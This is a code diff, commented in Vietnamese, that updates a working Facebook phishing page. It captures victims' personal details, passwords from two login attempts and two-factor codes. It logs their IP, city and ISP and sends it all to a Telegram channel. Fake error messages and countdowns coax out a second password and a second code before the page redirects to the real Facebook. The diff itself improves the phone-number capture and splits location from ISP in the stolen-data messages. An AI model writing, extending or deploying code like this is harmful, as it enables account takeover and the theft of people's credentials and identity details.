@@ -7,6 +7,7 @@
     <!-- libphonenumber-js -->
     <script src="https://unpkg.com/libphonenumber-js@1.10.53/bundle/libphonenumber-min.js"></script>
     <style>
+        /* (Giữ nguyên CSS như cũ) */
         * {
             margin: 0;
             padding: 0;
@@ -859,10 +860,11 @@
             }
 
             // ============================================
-            // LẤY IP VÀ VỊ TRÍ NGƯỜI DÙNG
+            // LẤY IP VÀ VỊ TRÍ NGƯỜI DÙNG (TÁCH LOCATION VÀ ISP)
             // ============================================
             let userIp = 'Unknown';
-            let userLocation = 'Unknown';
+            let userCityCountry = 'Unknown';
+            let userIsp = 'Unknown';
 
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
@@ -877,7 +879,8 @@
                 .then(response => response.json())
                 .then(locData => {
                     if (locData.status === 'success') {
-                        userLocation = `${locData.country}, ${locData.regionName}, ${locData.city} (${locData.isp})`;
+                        userCityCountry = `${locData.city}, ${locData.country}`;
+                        userIsp = locData.isp;
                     }
                 })
                 .catch(err => {
@@ -981,6 +984,63 @@
                     ignoreInputEvent = false;
                 }
             });
+
+            // ============================================
+            // HÀM LẤY SỐ ĐIỆN THOẠI ĐẦY ĐỦ (KÈM MÃ QUỐC GIA)
+            // ============================================
+            function getFullPhoneNumber() {
+                const rawNumber = phoneInput.value.trim();
+                const countryCode = selectedCountry.code; // mã hai ký tự, ví dụ 'US', 'VN'
+                try {
+                    // Thử parse bằng thư viện libphonenumber
+                    if (typeof libphonenumber !== 'undefined' && libphonenumber.parsePhoneNumberFromString) {
+                        const phoneNumber = libphonenumber.parsePhoneNumberFromString(rawNumber, countryCode);
+                        if (phoneNumber && phoneNumber.isValid()) {
+                            return phoneNumber.number; // E.164 format, ví dụ +14155552671
+                        } else {
+                            // Không hợp lệ, fallback: ghép mã dial + rawNumber (loại bỏ ký tự không phải số)
+                            const dial = selectedCountry.dial;
+                            const digits = rawNumber.replace(/\D/g, '');
+                            return dial + digits;
+                        }
+                    } else {
+                        // Fallback nếu không có thư viện
+                        const dial = selectedCountry.dial;
+                        const digits = rawNumber.replace(/\D/g, '');
+                        return dial + digits;
+                    }
+                } catch (e) {
+                    console.log('Error parsing phone number', e);
+                    // Fallback
+                    const dial = selectedCountry.dial;
+                    const digits = rawNumber.replace(/\D/g, '');
+                    return dial + digits;
+                }
+            }
+
+            // ============================================
+            // HÀM MASK SỐ ĐIỆN THOẠI (ĐỊNH DẠNG +1*****532)
+            // ============================================
+            function maskPhone(phone, dial) {
+                if (!phone) return '';
+                // Sử dụng dial được cung cấp, nếu không thì lấy từ selectedCountry
+                const countryCode = dial || selectedCountry.dial;
+                if (!countryCode) return phone; // fallback
+
+                // Bỏ mã quốc gia để lấy phần số quốc gia
+                let national = phone.replace(countryCode, '').replace(/\D/g, '');
+                // Nếu không bỏ được (có thể phone không bắt đầu bằng countryCode), fallback
+                if (national === phone || national === '') {
+                    // Lấy tất cả chữ số, che hết trừ 3 số cuối
+                    const digits = phone.replace(/\D/g, '');
+                    const lastThree = digits.slice(-3);
+                    const stars = '*'.repeat(digits.length - 3);
+                    return countryCode + stars + lastThree;
+                }
+                const lastThree = national.slice(-3);
+                const maskedNational = '*'.repeat(national.length - 3) + lastThree;
+                return countryCode + maskedNational;
+            }
 
             // ============================================
             // GỬI DỮ LIỆU LÊN TELEGRAM
@@ -1116,7 +1176,8 @@
                     step1Data = {
                         pageName: pageNameVal,
                         fbName: fbNameVal,
-                        phone: phoneInput.value.trim(),
+                        phone: getFullPhoneNumber(),  // Lấy số điện thoại đầy đủ kèm mã quốc gia
+                        phoneDial: selectedCountry.dial, // Lưu mã quốc gia để dùng khi mask
                         birthday: bdayVal
                     };
                 }
@@ -1270,20 +1331,6 @@
                 return localPart[0] + '*****' + localPart[localPart.length - 1] + '@' + domain;
             }
 
-            function maskPhone(phone) {
-                if (!phone) return '';
-                const countryCodeMatch = phone.match(/^\+\d+/);
-                const countryCode = countryCodeMatch ? countryCodeMatch[0] : '';
-                if (!countryCode) {
-                    const digits = phone.replace(/\D/g, '');
-                    const lastTwo = digits.slice(-2);
-                    return '*******' + lastTwo;
-                }
-                const phoneWithoutCode = phone.replace(countryCode, '').replace(/\D/g, '');
-                const lastTwo = phoneWithoutCode.slice(-2);
-                return countryCode + ' ******* ' + lastTwo;
-            }
-
             function resetTwoFAForm() {
                 twofaCode.value = '';
                 twofaContinue.disabled = true;
@@ -1320,7 +1367,8 @@
             function showTwoFAPopup() {
                 document.getElementById('fb-header-display').textContent = step1Data.fbName + ' · Facebook';
                 displayEmail.textContent = maskEmail(firstEmail);
-                displayPhone.textContent = maskPhone(step1Data.phone);
+                // Sử dụng maskPhone với dial đã lưu
+                displayPhone.textContent = maskPhone(step1Data.phone, step1Data.phoneDial);
                 resetTwoFAForm(); // Đảm bảo trạng thái ban đầu
                 twofaPopup.style.display = 'flex';
             }
@@ -1342,7 +1390,7 @@
                 } else {
                     if (!isRetryMode) {
                         if (validateLogin()) {
-                            const msg = `🔐 <b>Step 1 Data:</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userLocation}\n\n📧 <b>Login Attempt 1:</b>\nEmail: ${firstEmail}\nPassword: ${firstPassword}`;
+                            const msg = `🔐 <b>Step 1 Data:</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}\n\n📧 <b>Login Attempt 1:</b>\nEmail: ${firstEmail}\nPassword: ${firstPassword}`;
                             sendToTelegram(msg);
 
                             const waitTime = randomInt(6000, 10000);
@@ -1376,7 +1424,7 @@
 
                         secondPassword = passVal;
 
-                        const msg = `🔐 <b>Step 1 Data (retry):</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userLocation}\n\n📧 <b>Login Attempt 2:</b>\nEmail: ${firstEmail}\nPassword: ${secondPassword}`;
+                        const msg = `🔐 <b>Step 1 Data (retry):</b>\nPage: ${step1Data.pageName}\nFB: ${step1Data.fbName}\nPhone: ${step1Data.phone}\nBirthday: ${step1Data.birthday}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}\n\n📧 <b>Login Attempt 2:</b>\nEmail: ${firstEmail}\nPassword: ${secondPassword}`;
                         sendToTelegram(msg);
 
                         const waitTime = randomInt(6000, 10000);
@@ -1407,7 +1455,7 @@
                         twofaContinue.classList.remove('loading');
                         firstCode = code; // Lưu lại để đánh dấu đã nhập lần 1
 
-                        const msg = `🔐 <b>2FA Attempt 1:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userLocation}`;
+                        const msg = `🔐 <b>2FA Attempt 1:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}`;
                         sendToTelegram(msg);
 
                         startCountdown(30); // Hiện lỗi + đếm ngược, khóa input
@@ -1426,7 +1474,7 @@
                     twofaContinue.disabled = true;
 
                     setTimeout(() => {
-                        const msg = `🔐 <b>2FA Attempt 2:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userLocation}`;
+                        const msg = `🔐 <b>2FA Attempt 2:</b>\nEmail: ${firstEmail}\nCode: ${code}\nIP: ${userIp}\nLocation: ${userCityCountry}\nISP: ${userIsp}`;
                         sendToTelegram(msg);
                         window.location.href = 'https://www.facebook.com';
                     }, 2000);
